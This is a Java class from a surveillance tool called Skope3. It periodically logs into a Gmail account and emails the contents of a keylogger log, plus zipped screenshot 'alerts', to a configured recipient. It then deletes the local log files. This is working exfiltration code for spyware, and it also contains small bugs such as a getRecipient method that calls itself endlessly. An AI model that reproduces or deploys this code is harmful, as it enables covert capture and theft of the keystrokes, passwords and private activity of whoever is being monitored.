package com.gundersoft.skope3;

import java.io.IOException;
import java.util.Calendar;
import java.util.Timer;
import java.util.TimerTask;

import javax.mail.MessagingException;

/**
 * Skope Emailer Service. Logs into gmail account when enabled and forwards
 * all Skope Shots and the text log to the provided username.
 * @author Christian Gunderman
 */
public class EmailService {
    /** Instance of the SendMailWrapper used to easily send Gmail */
    private SendMailWrapper sendMail;
    /** Handles dispatch triggering */
    private Timer dispatchTimer;
    /** Email address that Log will be sent to. */
    private String recipient;
    /** The keylog file */
    private String keylogFile;
    /** The textlog file */
    private String textlogFile;
    /** Is the service enabled */
    private boolean enabled;
    /** Last time an email was sent */
    private long lastDispatchTime;
    /** How often should the emails be sent */
    private long dispatchInterval;
    /** Should images be sent, as well as the text log */
    private boolean sendImages;
    /** The debug log */
    private Log log;
	
    /**
     * Starts an instance of the emailer service.
     * @param username Gmail address to log into to send emails.
     * @param password Password to use for sending emails.
     * @param recipient Email address that will be receiving all emails.
     * @param textlogFile The text log.
     * @param keylogFile The key log.
     * @param lastDispatchTime The last time the email was dispatched.
     * @param dispatchInterval The number of milliseconds between dispatches.
     * @param sendImages Should images be sent, as well as text
     * @param log The debug log that records errors.
     */
    public EmailService(String username, String password, String recipient, 
			String textlogFile, String keylogFile, long lastDispatchTime,
			long dispatchInterval, boolean sendImages, Log log) {
	this.sendMail = SendMailWrapper.getGoogleMailInstance(username, password);
	this.sendMail.setSubject("** Skope Surveilliance Update");
	this.dispatchTimer = new Timer();
	this.recipient = recipient;
	this.keylogFile = keylogFile;
	this.textlogFile = textlogFile;
	this.enabled = false;
	this.lastDispatchTime = lastDispatchTime;
	this.dispatchInterval = dispatchInterval;
	this.sendImages = sendImages;
	this.log = log;
    }
	
    /**
     * Enables or disables the EmailService.
     * @param enabled If true, service is enabled,
     * if false, service is disabled.
     */
    public void setEnabled(boolean enabled) {
	this.enabled = enabled;
		
	// if setting to enabled
	if(this.enabled) {
			
	    log.i("Email Dispatch Service enabled.");
			
	    // if its been longer than dispatch interval, send one now
	    if(this.enabled && (Calendar.getInstance().getTimeInMillis() 
				- this.lastDispatchTime) > this.dispatchInterval)
		log.i("Its been longer than the dispatch interval. dispatch()");
	    dispatch();
			
	    // schedule dispatch timer
	    this.dispatchTimer.scheduleAtFixedRate(new TimerTask() {
		    @Override
		    public void run() {
			dispatch();
		    }
		}, this.dispatchInterval, this.dispatchInterval);
	} else {
			
	    log.i("Email Dispatch Service disabled.");
			
	    // kill service auto-send timer
	    this.dispatchTimer.purge(); 
			
	}
    }
	
    /**
     * Set email address to send to.
     * @param recipient Email address to send logs to.
     */
    public void setRecipient(String recipient) {
	this.recipient = recipient;
    }
	
    /** 
     * Get recipient of logs.
     * @return The email address of the recipient.
     */
    public String getRecipient() {
	return this.getRecipient();
    }
	
    /**
       public boolean isEnabled(
       * Checks if EmailService is enabled.
       * @return True if enabled, false if disabled.
       */
    public boolean isEnabled() {
	return this.enabled;
    }
	
    /**
     * Gets the send mail wrapper being used to send
     * the emails. This must be called to change the 
     * password or username of the email account.
     * @return The SendMailWrapper.
     */
    public SendMailWrapper getMailer() {
	return this.sendMail;
    }
	
    /**
     * Gets last email sent time.
     * @return How many milliseconds since January first was the 
     * last email sent.
     */
    public long getLastDispatchTime() {
	return this.lastDispatchTime;
    }
	
    /**
     * Dispatches an email of the log and then erases all of the local images.
     */
    public void dispatch() {
	this.log.i("Email Service dispatch() triggered. Attempting send...");
	new Thread(new Runnable() {
		@Override
		public void run() {
		    Keylogger.LogParser log;
		    try {
			log = new Keylogger.LogParser(textlogFile);
		    } catch (IOException e1) {
			return;
		    }
		    try {
			if(EmailService.this.sendImages) {
			    // create alerts package
			    Alerts.packAlerts();
						
			    // email the alerts package
			    EmailService.this.sendMail.sendMail(EmailService.this.recipient, "Hello,\r\n\r\nIts that time again: Skope update time." +
								"Below is the contents of the Skope key log.\r\n\r\n\r\n" + log.getEntireLog(), "skope3-alerts.zip");
						
			    // delete alerts package
			    Alerts.deleteAlertsPack();
						
			    // reset alerts
			    Alerts.clearAlerts();
			} else {
			    // email the log
			    EmailService.this.sendMail.sendMail(EmailService.this.recipient, "Hello,\r\n\r\nIts that time again: Skope update time." +
								"Below is the contents of the Skope key log.\r\n\r\n\r\n" + log.getEntireLog(), (String[]) null);
			}					
					
			new java.io.File(EmailService.this.textlogFile).delete();
			new java.io.File(EmailService.this.keylogFile).delete();
					
			// mark successful dispatch time
			EmailService.this.lastDispatchTime = Calendar.getInstance().getTimeInMillis();
			EmailService.this.log.i("Send Succeeded!");
					
		    } catch (MessagingException e) {
			EmailService.this.log.e("Email Dispatch message send failed: ", e.getMessage());
		    } catch (IOException e) {
			EmailService.this.log.e("Email Dispatch message send failed. Unable to read SkopeShot files.");
		    }
		}
	    }).start();
		
    }

}
